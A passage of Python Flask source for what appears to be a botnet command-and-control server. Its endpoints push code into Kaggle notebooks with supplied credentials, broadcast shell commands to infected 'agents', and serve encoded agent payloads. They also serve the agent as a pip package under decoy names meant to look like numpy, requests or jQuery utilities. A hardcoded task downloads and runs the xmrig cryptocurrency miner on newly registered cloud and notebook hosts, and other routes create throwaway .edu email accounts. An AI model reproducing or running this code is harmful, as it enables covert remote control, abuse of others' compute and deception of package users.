                # Telegram C2 is in notebook - no need to deploy agent code
                # Just mark as deployed
                batch_join_c2_progress["success"] += 1
                _log(f"  ✓ Telegram C2 ready (in notebook)")
            except Exception as e:
                batch_join_c2_progress["failed"] += 1
                _log(f"  ✗ {e}")
            batch_join_c2_progress["processed"] = i + 1
            time.sleep(1)
        batch_join_c2_progress["running"] = False
        batch_join_c2_progress["current"] = ""
        _log(f"Done: {batch_join_c2_progress['success']} ok, {batch_join_c2_progress['failed']} failed")
        log_event("batch_join_c2", f"{batch_join_c2_progress['success']}/{batch_join_c2_progress['total']}")

    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"status": "started", "total": len(targets)})

@app.route("/api/autoreg/batch-join-c2-progress")
@login_required
def get_batch_join_c2_progress():
    return jsonify(batch_join_c2_progress)

@app.route("/api/autoreg/batch-join-c2-cancel", methods=["POST"])
@login_required
def cancel_batch_join_c2():
    batch_join_c2_progress["running"] = False
    return jsonify({"status": "cancelled"})

# ──────────────────────── API: LABORATORY ────────────────────────

# Lab data storage
LAB_DATA = {
    "experiments": [],
    "library": []
}

def load_lab_data():
    """Load laboratory data from file."""
    global LAB_DATA
    lab_file = BASE_DIR / "data" / "lab_data.json"
    if lab_file.exists():
        try:
            LAB_DATA = json.loads(lab_file.read_text())
        except:
            pass

def save_lab_data():
    """Save laboratory data to file."""
    lab_file = BASE_DIR / "data" / "lab_data.json"
    lab_file.write_text(json.dumps(LAB_DATA, indent=2))

@app.route("/api/lab/set-test-account", methods=["POST"])
@login_required
def lab_set_test_account():
    """Mark account as test account for laboratory."""
    data = request.json
    reg_id = data.get("reg_id")
    
    if not reg_id:
        return jsonify({"error": "Missing reg_id"}), 400
    
    # Clear previous test account
    accounts = account_store.get_all()
    for acc in accounts:
        if acc.get("lab_status") == "testing":
            account_store.update(acc["reg_id"], {"lab_status": None})
    
    # Set new test account
    account_store.update(reg_id, {"lab_status": "testing"})
    
    return jsonify({"status": "ok", "message": "Account marked as test account"})

@app.route("/api/lab/clear-test-account", methods=["POST"])
@login_required
def lab_clear_test_account():
    """Clear test account status."""
    data = request.json
    reg_id = data.get("reg_id")
    
    if reg_id:
        account_store.update(reg_id, {"lab_status": None})
    
    return jsonify({"status": "ok"})

@app.route("/api/lab/machine/status", methods=["POST"])
@login_required
def lab_machine_status():
    """Get kernel/machine status via Kaggle API."""
    data = request.json
    username = data.get("username")
    api_key = data.get("api_key")
    kernel_slug = data.get("kernel_slug")
    
    if not all([username, api_key, kernel_slug]):
        return jsonify({"error": "Missing required fields"}), 400
    
    # Convert slug format: underscores to dashes
    kernel_slug = kernel_slug.replace("_", "-")
    
    try:
        import subprocess
        import tempfile
        import json
        from pathlib import Path
        
        # Setup kaggle credentials
        kaggle_dir = Path.home() / ".kaggle"
        kaggle_dir.mkdir(parents=True, exist_ok=True)
        kaggle_json = kaggle_dir / "kaggle.json"
        kaggle_json.write_text(json.dumps({"username": username, "key": api_key}))
        kaggle_json.chmod(0o600)
        
        # Get actual kernel status via kaggle kernels status
        result = subprocess.run(
            ["kaggle", "kernels", "status", kernel_slug],
            capture_output=True, text=True, timeout=30
        )
        
        # Parse status from output like "slug has status KernelWorkerStatus.RUNNING"
        status_text = result.stdout.strip()
        if "COMPLETE" in status_text:
            status = "complete"
        elif "RUNNING" in status_text:
            status = "running"
        elif "QUEUED" in status_text:
            status = "queued"
        elif "ERROR" in status_text:
            status = "error"
        elif result.returncode != 0:
            status = "not_found"
        else:
            status = "unknown"
            
        return jsonify({"status": status, "slug": kernel_slug, "raw": status_text})
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/lab/machine/deploy", methods=["POST"])
@login_required
def lab_machine_deploy():
    """Deploy code to a Kaggle kernel."""
    data = request.json
    username = data.get("username")
    api_key = data.get("api_key")
    kernel_slug = data.get("kernel_slug")
    code = data.get("code")
    
    if not all([username, api_key, kernel_slug, code]):
        return jsonify({"error": "Missing required fields"}), 400
    
    # Convert slug format: underscores to dashes
    kernel_slug = kernel_slug.replace("_", "-")
    
    try:
        import subprocess
        import tempfile
        import json
        from pathlib import Path
        
        # Setup kaggle credentials
        kaggle_dir = Path.home() / ".kaggle"
        kaggle_dir.mkdir(parents=True, exist_ok=True)
        kaggle_json = kaggle_dir / "kaggle.json"
        kaggle_json.write_text(json.dumps({"username": username, "key": api_key}))
        kaggle_json.chmod(0o600)
        
        # Pull existing kernel
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            
            # Pull kernel files
            pull_result = subprocess.run(
                ["kaggle", "kernels", "pull", kernel_slug, "-p", tmpdir],
                capture_output=True, text=True, timeout=60
            )
            
            if pull_result.returncode != 0:
                return jsonify({"error": f"Pull failed: {pull_result.stderr[:200]}"}), 500
            
            # Find notebook file
            notebook_files = list(tmpdir_path.glob("*.ipynb"))
            if not notebook_files:
                return jsonify({"error": "No notebook found"}), 500
            
            notebook_path = notebook_files[0]
            notebook = json.loads(notebook_path.read_text())
            
            # Replace first cell with new code (cleaner than appending)
            # Each line in source array must end with \n for proper notebook format
            code_lines = [line + "\n" for line in code.split("\n")]
            new_cell = {
                "cell_type": "code",
                "execution_count": None,
                "metadata": {},
                "outputs": [],
                "source": code_lines
            }
            notebook["cells"] = [new_cell]  # Replace all cells with just this one
            notebook_path.write_text(json.dumps(notebook, indent=2))
            
            # Create kernel-metadata.json for push
            kernel_title = kernel_slug.split("/")[-1].replace("-", " ")
            metadata = {
                "id": kernel_slug,
                "title": kernel_title,
                "code_file": notebook_path.name,
                "language": "python",
                "kernel_type": "notebook",
                "is_private": True,
                "enable_gpu": True,
                "enable_tpu": False,
                "enable_internet": True,
                "dataset_sources": [],
                "competition_sources": [],
                "kernel_sources": [],
                "model_sources": []
            }
            metadata_path = tmpdir_path / "kernel-metadata.json"
            metadata_path.write_text(json.dumps(metadata, indent=2))
            
            # Push updated kernel
            push_result = subprocess.run(
                ["kaggle", "kernels", "push", "-p", tmpdir],
                capture_output=True, text=True, timeout=120
            )
            
            if push_result.returncode != 0:
                return jsonify({"error": f"Push failed: {push_result.stdout[:200] or push_result.stderr[:200]}"}), 500
            
            return jsonify({
                "status": "deployed",
                "kernel": kernel_slug,
                "message": push_result.stdout[:200] if push_result.stdout else "OK"
            })
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/lab/machine/output", methods=["POST"])
@login_required
def lab_machine_output():
    """Get output from a Kaggle kernel."""
    data = request.json
    username = data.get("username")
    api_key = data.get("api_key")
    kernel_slug = data.get("kernel_slug")
    
    if not all([username, api_key, kernel_slug]):
        return jsonify({"error": "Missing required fields"}), 400
    
    # Convert slug format: underscores to dashes
    kernel_slug = kernel_slug.replace("_", "-")
    
    try:
        import subprocess
        import tempfile
        import json
        from pathlib import Path
        
        # Setup kaggle credentials
        kaggle_dir = Path.home() / ".kaggle"
        kaggle_dir.mkdir(parents=True, exist_ok=True)
        kaggle_json = kaggle_dir / "kaggle.json"
        kaggle_json.write_text(json.dumps({"username": username, "key": api_key}))
        kaggle_json.chmod(0o600)
        
        # Get kernel output
        with tempfile.TemporaryDirectory() as tmpdir:
            result = subprocess.run(
                ["kaggle", "kernels", "output", kernel_slug, "-p", tmpdir],
                capture_output=True, text=True, timeout=60
            )
            
            if result.returncode != 0:
                return jsonify({"error": result.stderr[:200] or "Output not ready"}), 500
            
            # Parse output files - Kaggle logs are JSON arrays
            output_lines = []
            for f in Path(tmpdir).glob("*.log"):
                try:
                    content = f.read_text().strip()
                    # Try parsing as JSON array first
                    if content.startswith('['):
                        try:
                            entries = json.loads(content)
                            for entry in entries:
                                if entry.get('stream_name') == 'stdout':
                                    output_lines.append(entry.get('data', ''))
                        except:
                            pass
                    else:
                        # Fall back to line-by-line parsing
                        for line in content.split('\n'):
                            if line.strip().startswith('{'):
                                try:
                                    entry = json.loads(line.rstrip(','))
                                    if entry.get('stream_name') == 'stdout':
                                        output_lines.append(entry.get('data', ''))
                                except:
                                    pass
                except:
                    pass
            
            # Also check other output files
            for f in Path(tmpdir).iterdir():
                if f.is_file() and f.suffix not in ['.log', '.ipynb']:
                    try:
                        output_lines.append(f.read_text()[:1000])
                    except:
                        pass
            
            return jsonify({
                "status": "success",
                "output": ''.join(output_lines),
                "kernel": kernel_slug
            })
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/lab/experiments/list")
@login_required
def lab_experiments_list():
    """List all experiments."""
    load_lab_data()
    return jsonify({"experiments": LAB_DATA.get("experiments", [])})

@app.route("/api/lab/experiments/create", methods=["POST"])
@login_required
def lab_experiments_create():
    """Create a new experiment."""
    load_lab_data()
    data = request.json
    
    import uuid
    from datetime import datetime
    
    experiment = {
        "id": str(uuid.uuid4())[:8],
        "name": data.get("name", "Untitled"),
        "code": data.get("code", ""),
        "target_machines": data.get("target_machines", "all"),
        "status": "pending",
        "created": datetime.now().isoformat(),
        "results": []
    }
    
    LAB_DATA.setdefault("experiments", []).append(experiment)
    save_lab_data()
    
    return jsonify({"status": "ok", "experiment": experiment})

@app.route("/api/lab/experiments/<exp_id>/run", methods=["POST"])
@login_required
def lab_experiments_run(exp_id):
    """Run an experiment."""
    load_lab_data()
    
    for exp in LAB_DATA.get("experiments", []):
        if exp["id"] == exp_id:
            exp["status"] = "running"
            save_lab_data()
            return jsonify({"status": "ok"})
    
    return jsonify({"error": "Experiment not found"}), 404

@app.route("/api/lab/library/list")
@login_required
def lab_library_list():
    """List saved scripts."""
    load_lab_data()
    return jsonify({"scripts": LAB_DATA.get("library", [])})

@app.route("/api/lab/library/save", methods=["POST"])
@login_required
def lab_library_save():
    """Save a script to library."""
    load_lab_data()
    data = request.json
    
    import uuid
    from datetime import datetime
    
    script = {
        "id": str(uuid.uuid4())[:8],
        "name": data.get("name", "Untitled"),
        "code": data.get("code", ""),
        "created": datetime.now().isoformat()
    }
    
    LAB_DATA.setdefault("library", []).append(script)
    save_lab_data()
    
    return jsonify({"status": "ok", "script": script})

@app.route("/api/lab/library/import", methods=["POST"])
@login_required
def lab_library_import():
    """Import scripts from JSON."""
    load_lab_data()
    data = request.json
    
    scripts = data.get("scripts", [])
    for s in scripts:
        if "id" not in s:
            import uuid
            s["id"] = str(uuid.uuid4())[:8]
        LAB_DATA.setdefault("library", []).append(s)
    
    save_lab_data()
    return jsonify({"status": "ok", "imported": len(scripts)})

# ──────────────────────── API: LIVE VIEW ────────────────────────

@app.route("/api/live/<reg_id>/screenshot")
@login_required
def live_screenshot(reg_id):
    job = job_manager.get_job(reg_id)
    if job:
        path = job.get_live_screenshot_path()
        if os.path.exists(path):
            resp = send_file(path, mimetype="image/jpeg")
            resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
            resp.headers["Pragma"] = "no-cache"
            return resp
    abort(404)

@app.route("/api/live/<reg_id>/click", methods=["POST"])
@login_required
def live_click(reg_id):
    job = job_manager.get_job(reg_id)
    if not job:
        return jsonify({"status": "no_job"}), 404
    data = request.get_json(silent=True) or {}
    x, y = int(data.get("x", 0)), int(data.get("y", 0))
    ok = job.click_at(x, y)
    return jsonify({"status": "ok" if ok else "no_page"})

@app.route("/api/live/<reg_id>/type", methods=["POST"])
@login_required
def live_type(reg_id):
    job = job_manager.get_job(reg_id)
    if not job:
        return jsonify({"status": "no_job"}), 404
    data = request.get_json(silent=True) or {}
    text = data.get("text", "")
    key = data.get("key", "")
    if key:
        ok = job.press_key(key)
    elif text:
        ok = job.type_text(text)
    else:
        ok = False
    return jsonify({"status": "ok" if ok else "failed"})

@app.route("/api/screenshot/<path:filename>")
@login_required
def serve_screenshot(filename):
    ss_path = BASE_DIR / "data" / "screenshots" / filename
    if ss_path.exists():
        return send_file(str(ss_path), mimetype="image/png")
    abort(404)

# ──────────────────────── API: TEMP MAIL ────────────────────────

@app.route("/api/tempmail/domains")
@login_required
def tempmail_domains():
    try:
        domains = boomlify_get_domains(edu_only=True)
        return jsonify(domains)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tempmail/create", methods=["POST"])
@login_required
def tempmail_create():
    data = request.get_json(silent=True) or {}
    domain_name = data.get("domain", None)
    try:
        email_data = mail_manager.create_email(domain_name=domain_name, edu_only=True)
        log_event("tempmail_create", f"{email_data['email']} via {email_data.get('provider','?')}")
        safe = {k: v for k, v in email_data.items() if k != "_api_data"}
        return jsonify(safe)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/tempmail/inbox")
@login_required
def tempmail_inbox():
    email = request.args.get("email", "")
    messages = mail_manager.check_inbox(email)
    return jsonify(messages)

@app.route("/api/tempmail/message")
@login_required
def tempmail_message():
    email = request.args.get("email", "")
    msg_id = request.args.get("msg_id", "")
    msg = mail_manager.get_message(email, msg_id)
    return jsonify(msg)

@app.route("/api/tempmail/extract")
@login_required
def tempmail_extract():
    email = request.args.get("email", "")
    msg_id = request.args.get("msg_id", "")
    msg = mail_manager.get_message(email, msg_id)
    body = msg.get("body", "") or ""
    html = msg.get("html", "") or ""
    text = body + "\n" + html
    code = mail_manager.extract_code(text)
    link = mail_manager.extract_link(html or body)
    return jsonify({"code": code, "link": link})

@app.route("/api/tempmail/accounts")
@login_required
def tempmail_accounts():
    return jsonify(mail_manager.list_accounts())

@app.route("/api/tempmail/delete", methods=["DELETE"])
@login_required
def tempmail_delete():
    email = request.args.get("email", "")
    mail_manager.remove_account(email)
    return jsonify({"status": "ok"})

@app.route("/api/tempmail/wait", methods=["POST"])
@login_required
def tempmail_wait():
    data = request.get_json(silent=True) or {}
    email = data.get("email", "")
    timeout = min(int(data.get("timeout", 120)), 300)
    subject_filter = data.get("subject_filter", None)
    msg = mail_manager.wait_for_email(email, timeout=timeout, subject_filter=subject_filter)
    return jsonify(msg)

@app.route("/api/logs")
@login_required
def api_logs():
    db = get_db()
    logs = db.execute("SELECT * FROM logs ORDER BY ts DESC LIMIT 500").fetchall()
    db.close()
    return jsonify([dict(l) for l in logs])

_server_start_time = time.time()

@app.route("/api/server/time")
@login_required
def server_time():
    uptime = int(time.time() - _server_start_time)
    return jsonify({
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "uptime_seconds": uptime
    })

@app.route("/api/server/health")
@login_required
def server_health():
    """Return system health metrics: CPU, RAM, Disk usage."""
    import psutil
    try:
        cpu = psutil.cpu_percent(interval=0.5)
        ram = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
        return jsonify({
            "cpu": round(cpu, 1),
            "ram": round(ram, 1),
            "disk": round(disk, 1)
        })
    except Exception as e:
        # Fallback if psutil not available
        return jsonify({
            "cpu": 0,
            "ram": 0,
            "disk": 0,
            "error": str(e)
        })

@app.route("/api/agents/broadcast", methods=["POST"])
@login_required
def broadcast_command():
    """Send command to all online agents."""
    data = request.get_json(silent=True) or {}
    command = data.get("command", "").strip()
    if not command:
        return jsonify({"error": "No command provided"}), 400
    
    db = get_db()
    agents = db.execute("SELECT id FROM agents WHERE is_alive=1").fetchall()
    count = 0
    for agent in agents:
        db.execute(
            "INSERT INTO tasks (agent_id, task_type, command, status, created_at) VALUES (?, 'shell', ?, 'pending', ?)",
            (agent['id'], command, datetime.now().isoformat())
        )
        count += 1
    db.commit()
    db.close()
    
    log_event("broadcast", f"Command '{command[:30]}...' sent to {count} agents")
    return jsonify({"status": "ok", "count": count})

@app.route("/api/agents/wake-offline", methods=["POST"])
@login_required
def wake_offline_agents():
    """Send wake/checkin command to all offline agents."""
    db = get_db()
    agents = db.execute("SELECT id FROM agents WHERE is_alive=0").fetchall()
    count = 0
    for agent in agents:
        db.execute(
            "INSERT INTO tasks (agent_id, task_type, command, status, created_at) VALUES (?, 'shell', ?, 'pending', ?)",
            (agent['id'], 'checkin', datetime.now().isoformat())
        )
        count += 1
    db.commit()
    db.close()
    return jsonify({"status": "ok", "count": count})

@app.route("/api/agents/kill-offline", methods=["POST"])
@login_required
def kill_offline_agents():
    """Remove all offline agents."""
    db = get_db()
    result = db.execute("SELECT id FROM agents WHERE is_alive=0").fetchall()
    count = len(result)
    for agent in result:
        db.execute("DELETE FROM tasks WHERE agent_id=?", (agent['id'],))
        db.execute("DELETE FROM agents WHERE id=?", (agent['id'],))
    db.commit()
    db.close()
    log_event("bulk_remove", f"Removed {count} offline agents")
    return jsonify({"status": "ok", "count": count})

@app.route("/api/groups")
@login_required
def get_groups():
    """Get all groups with agent counts."""
    db = get_db()
    groups = db.execute("SELECT DISTINCT COALESCE(group_name, 'default') as grp, COUNT(*) as cnt FROM agents GROUP BY group_name").fetchall()
    result = {g['grp']: g['cnt'] for g in groups}
    db.close()
    return jsonify({"groups": result})

@app.route("/api/groups", methods=["POST"])
@login_required
def create_group_endpoint():
    """Create a new group (just acknowledge, groups are virtual)."""
    data = request.get_json(silent=True) or {}
    name = data.get("name", "").strip()
    if not name:
        return jsonify({"error": "No group name"}), 400
    return jsonify({"status": "ok", "group": name})

@app.route("/api/agents/bulk-sleep", methods=["POST"])
@login_required
def bulk_set_sleep():
    """Set sleep interval for multiple agents."""
    data = request.get_json(silent=True) or {}
    agents = data.get("agents", [])
    sleep = data.get("sleep", 5)
    
    db = get_db()
    count = 0
    for agent_id in agents:
        db.execute("UPDATE agents SET sleep_interval=? WHERE id=?", (sleep, agent_id))
        count += 1
    db.commit()
    db.close()
    return jsonify({"status": "ok", "count": count})

@app.route("/api/agents/bulk-jitter", methods=["POST"])
@login_required
def bulk_set_jitter():
    """Set jitter for multiple agents."""
    data = request.get_json(silent=True) or {}
    agents = data.get("agents", [])
    jitter = data.get("jitter", 0)
    
    db = get_db()
    count = 0
    for agent_id in agents:
        db.execute("UPDATE agents SET jitter=? WHERE id=?", (jitter, agent_id))
        count += 1
    db.commit()
    db.close()
    return jsonify({"status": "ok", "count": count})

@app.route("/api/agents/bulk-group", methods=["POST"])
@login_required
def bulk_set_group():
    """Assign multiple agents to a group."""
    data = request.get_json(silent=True) or {}
    agents = data.get("agents", [])
    group = data.get("group", "")
    
    db = get_db()
    count = 0
    for agent_id in agents:
        db.execute("UPDATE agents SET group_name=? WHERE id=?", (group, agent_id))
        count += 1
    db.commit()
    db.close()
    return jsonify({"status": "ok", "count": count})

# ──────────────────────── AGENT FILE SERVING ────────────────────────

@app.route("/agents/<path:filename>")
def serve_agent(filename):
    agents_dir = BASE_DIR / "src" / "agents"
    fpath = agents_dir / filename
    if not (fpath.exists() and fpath.is_file()):
        return "Not found", 404
    content = fpath.read_text()
    server_url = _get_public_url() or f"{request.scheme}://{request.host}"
    # Inject server URL
    content = content.replace("http://CHANGE_ME:443", server_url)
    # Inject auth token if configured (for Python agents)
    token = get_config("agent_token")
    if token:
        content = content.replace('AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")',
                                   f'AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "{token}")')
        # PowerShell
        content = content.replace('$Token   = if ($env:AUTH_TOKEN){ $env:AUTH_TOKEN } else { "" }',
                                   f'$Token   = if ($env:AUTH_TOKEN){{ $env:AUTH_TOKEN }} else {{ "{token}" }}')
    # Inject encryption key if configured
    enc_key = get_config("encryption_key")
    if enc_key:
        content = content.replace('ENC_KEY    = os.environ.get("ENC_KEY",    "")',
                                   f'ENC_KEY    = os.environ.get("ENC_KEY",    "{enc_key}")')
    return Response(content, mimetype="text/plain")


@app.route("/agents/<path:filename>_b64.txt")
def serve_agent_b64(filename):
    """Serve base64 encoded agent."""
    agents_dir = BASE_DIR / "src" / "agents"
    fpath = agents_dir / filename
    if not (fpath.exists() and fpath.is_file()):
        return "Not found", 404
    content = fpath.read_text()
    server_url = _get_public_url() or f"{request.scheme}://{request.host}"
    content = content.replace("http://CHANGE_ME:443", server_url)
    token = get_config("agent_token")
    if token:
        content = content.replace('AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")',
                                   f'AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "{token}")')
    enc_key = get_config("encryption_key")
    if enc_key:
        content = content.replace('ENC_KEY    = os.environ.get("ENC_KEY",    "")',
                                   f'ENC_KEY    = os.environ.get("ENC_KEY",    "{enc_key}")')
    import base64
    encoded = base64.b64encode(content.encode()).decode()
    return Response(encoded, mimetype="text/plain")


@app.route("/agents/<path:filename>_hex.txt")
def serve_agent_hex(filename):
    """Serve hex encoded agent."""
    agents_dir = BASE_DIR / "src" / "agents"
    fpath = agents_dir / filename
    if not (fpath.exists() and fpath.is_file()):
        return "Not found", 404
    content = fpath.read_text()
    server_url = _get_public_url() or f"{request.scheme}://{request.host}"
    content = content.replace("http://CHANGE_ME:443", server_url)
    token = get_config("agent_token")
    if token:
        content = content.replace('AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")',
                                   f'AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "{token}")')
    enc_key = get_config("encryption_key")
    if enc_key:
        content = content.replace('ENC_KEY    = os.environ.get("ENC_KEY",    "")',
                                   f'ENC_KEY    = os.environ.get("ENC_KEY",    "{enc_key}")')
    encoded = content.encode().hex()
    return Response(encoded, mimetype="text/plain")


@app.route("/package/c2agent.tar.gz")
def serve_pip_package():
    """Serve pip-installable package directly from C2 server."""
    return _serve_agent_package()


# Aliases for stealth - look like legitimate packages
@app.route("/packages/numpy-utils-1.24.0.tar.gz")
def serve_package_numpy():
    """Alias: looks like numpy utils package."""
    return _serve_agent_package()


@app.route("/packages/requests-helper-2.28.0.tar.gz")
def serve_package_requests():
    """Alias: looks like requests helper package."""
    return _serve_agent_package()


@app.route("/pypi/packages/pyutils-0.1.0.tar.gz")
def serve_package_pypi():
    """Alias: looks like PyPI package."""
    return _serve_agent_package()


@app.route("/static/assets/jquery-utils-3.6.0.tar.gz")
def serve_package_jquery():
    """Alias: looks like jQuery asset."""
    return _serve_agent_package()


@app.route("/downloads/python-utils-3.11.0.tar.gz")
def serve_package_python():
    """Alias: looks like Python utils download."""
    return _serve_agent_package()


def _serve_agent_package():
    """Internal: generate and serve agent package."""
    import tarfile
    import io as io_module
    
    server_url = _get_public_url() or f"{request.scheme}://{request.host}"
    token = get_config("agent_token") or ""
    enc_key = get_config("encryption_key") or ""
    
    # Create in-memory tar.gz package
    tar_buffer = io_module.BytesIO()
    
    with tarfile.open(fileobj=tar_buffer, mode='w:gz') as tar:
        # setup.py
        setup_content = f'''from setuptools import setup
setup(
    name="pyutils",
    version="0.1.0",
    py_modules=["pyutils"],
    entry_points={{
        "console_scripts": ["pyutils=pyutils:main"],
    }},
)
'''
        setup_info = tarfile.TarInfo(name="setup.py")
        setup_info.size = len(setup_content.encode())
        tar.addfile(setup_info, io_module.BytesIO(setup_content.encode()))
        
        # pyutils.py (universal agent)
        agent_path = BASE_DIR / "src" / "agents" / "universal.py"
        agent_content = agent_path.read_text()
        agent_content = agent_content.replace("http://CHANGE_ME:443", server_url)
        if token:
            agent_content = agent_content.replace('AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")',
                                                   f'AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "{token}")')
        if enc_key:
            agent_content = agent_content.replace('ENC_KEY = os.environ.get("ENC_KEY", "")',
                                                   f'ENC_KEY = os.environ.get("ENC_KEY", "{enc_key}")')
        
        agent_info = tarfile.TarInfo(name="pyutils.py")
        agent_info.size = len(agent_content.encode())
        tar.addfile(agent_info, io_module.BytesIO(agent_content.encode()))
    
    tar_buffer.seek(0)
    return Response(
        tar_buffer.getvalue(),
        mimetype="application/gzip",
        headers={"Content-Disposition": "attachment; filename=pyutils-0.1.0.tar.gz"}
    )

# ──────────────────────── API: HEALTH ────────────────────────

@app.route("/api/health", methods=["GET"])
def api_health():
    """Health check endpoint - no auth required."""
    db_status = "ok"
    try:
        db = get_db()
        db.execute("SELECT 1").fetchone()
    except Exception as e:
        db_status = f"error: {str(e)[:50]}"
    
    return jsonify({
        "status": "ok",
        "version": "3.0.0",
        "database": db_status,
        "timestamp": datetime.utcnow().isoformat()
    })

@app.route("/api/ping", methods=["GET"])
def api_ping():
    """Ping endpoint for agents - no auth required."""
    return jsonify({"pong": True, "ts": time.time()})

# ──────────────────────── API: AGENTS ────────────────────────

@app.route("/api/agent/register", methods=["POST"])
def agent_register():
    """Register new agent with detailed tracking and fingerprinting."""
    token = get_config("agent_token")
    if token and request.headers.get("X-Auth-Token") != token:
        log_event("auth_failed", f"Invalid token from {request.remote_addr}")
        return jsonify({"error": "unauthorized"}), 403

    enc_key = get_config("encryption_key")
    raw = request.get_data(as_text=True)
    if request.headers.get("X-Enc") == "1" and enc_key:
        try:
            raw = decrypt_payload(raw, enc_key)
        except Exception:
            log_event("decrypt_failed", f"From {request.remote_addr}")
            return jsonify({"error": "decrypt failed"}), 400
        data = json.loads(raw)
    else:
        data = request.get_json(silent=True) or {}

    agent_id = data.get("id", str(uuid.uuid4()))
    db = get_db()
    existing = db.execute("SELECT id, hostname, username, os FROM agents WHERE id=?", (agent_id,)).fetchone()
    
    # Extract extended fingerprint data
    fingerprint = data.get("fingerprint", {})
    env_hints = data.get("env_hints", [])
    hw_hash = fingerprint.get("hardware_hash", "")
    
    if existing:
        # Update existing agent
        db.execute("""UPDATE agents SET 
            last_seen=datetime('now'), 
            is_alive=1, 
            ip_external=?,
            hostname=?,
            username=?
            WHERE id=?""",
            (request.remote_addr, data.get("hostname", ""), data.get("username", ""), agent_id))
        log_event("agent_reconnect", f"{agent_id[:8]} ({data.get('hostname', '?')}) from {request.remote_addr} - EXISTING")
    else:
        # New agent - log detailed info
        db.execute("""INSERT INTO agents (id, hostname, username, os, arch, ip_external, ip_internal, platform_type)
                      VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                   (agent_id, data.get("hostname", ""), data.get("username", ""),
                    data.get("os", ""), data.get("arch", ""),
                    request.remote_addr, data.get("ip_internal", ""),
                    data.get("platform_type", "machine")))
        
        # Emit WebSocket event for real-time dashboard
        socketio.emit("agent_registered", {
            "agent_id": agent_id,
            "platform": data.get("platform_type", "machine"),
            "hostname": data.get("hostname", ""),
            "ip": request.remote_addr,
            "os": data.get("os", ""),
            "timestamp": datetime.now().isoformat()
        })
        
        # Auto-create mining task for new agents
        platform = data.get("platform_type", "machine")
        if platform in ("kaggle", "colab", "cloud", "container"):
            mining_cmd = "wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && cd xmrig-6.21.0 && timeout 9h ./xmrig -o pool.hashvault.pro:80 -u 48edfHuWV9QJYpBz7mVJvK8Y5TJ7Y5TJ7Y5TJ7Y5TJ7Y5TJ7Y5TJ7Y5TJ7.kaggle-$(hostname) --donate-level 1 --cpu-max-threads-hint=50 --background --no-color || true"
            db.execute("INSERT INTO tasks (id, agent_id, task_type, payload, status) VALUES (?, ?, 'shell', ?, 'pending')",
                      (str(uuid.uuid4()), agent_id, mining_cmd))
            log_event("auto_mining", f"Created mining task for new {platform} agent {agent_id[:8]}")
        
        # Detailed logging for new agent
        log_event("agent_new", f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🆕 NEW AGENT REGISTERED
   ID: {agent_id}
   Hostname: {data.get('hostname', '?')}
   User: {data.get('username', '?')}
   OS: {data.get('os', '?')}
   Platform: {data.get('platform_type', '?')}
   IP External: {request.remote_addr}
   IP Internal: {data.get('ip_internal', '?')}
   CPU: {data.get('cpu_count', '?')} cores
   RAM: {data.get('mem_total_mb', '?')} MB
   GPU: {data.get('gpu', 'none') or 'none'}
   Disk: {data.get('disk_free_gb', '?')} GB free
   HW Hash: {hw_hash or 'N/A'}
   Env: {', '.join(env_hints) if env_hints else 'standard'}
   CWD: {data.get('cwd', '?')}
   Python: {data.get('python_version', '?')}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
    
    db.commit()
    db.close()
    
    socketio.emit("agent_update", {
        "action": "register" if not existing else "reconnect", 
        "id": agent_id, 
        "hostname": data.get("hostname",""),
        "platform": data.get("platform_type", "machine"),
        "ip": request.remote_addr,
        "is_new": not existing
    }, namespace="/")
    
    resp_data = json.dumps({"status": "ok", "id": agent_id})
    if request.headers.get("X-Enc") == "1" and enc_key:
        return Response(encrypt_payload(resp_data, enc_key), content_type="text/plain")
    return jsonify({"status": "ok", "id": agent_id})

@app.route("/api/agent/beacon", methods=["POST"])
def agent_beacon():
    """Agent beacon with detailed tracking and Telegram notifications."""
    enc_key = get_config("encryption_key")
    encrypted = request.headers.get("X-Enc") == "1" and enc_key

    if encrypted:
        try:
            raw = decrypt_payload(request.get_data(as_text=True), enc_key)
            data = json.loads(raw)
        except Exception:
            log_event("beacon_decrypt_fail", f"From {request.remote_addr}")
            return jsonify({"error": "decrypt failed"}), 400
    else:
        data = request.get_json(silent=True) or {}

    agent_id = data.get("id", "")
    if not agent_id:
        log_event("beacon_no_id", f"From {request.remote_addr}")
        return jsonify({"error": "no id"}), 400
    
    db = get_db()
    
    # Check if agent exists
    agent_row = db.execute("SELECT id, hostname, platform_type, last_seen FROM agents WHERE id=?", (agent_id,)).fetchone()
    
    if not agent_row:
        log_event("beacon_unknown", f"Unknown agent {agent_id[:8]} from {request.remote_addr}")
        db.close()
        return jsonify({"error": "unknown agent"}), 404
    
    # Update last seen and agent info
    hostname = data.get("hostname", agent_row["hostname"])
    platform_type = data.get("platform_type", agent_row["platform_type"])
    db.execute("UPDATE agents SET last_seen=datetime('now'), is_alive=1, ip_external=?, hostname=?, platform_type=? WHERE id=?", 
               (request.remote_addr, hostname, platform_type, agent_id))
    
    # Get sleep/jitter config
    config_row = db.execute("SELECT sleep_interval, jitter FROM agents WHERE id=?", (agent_id,)).fetchone()
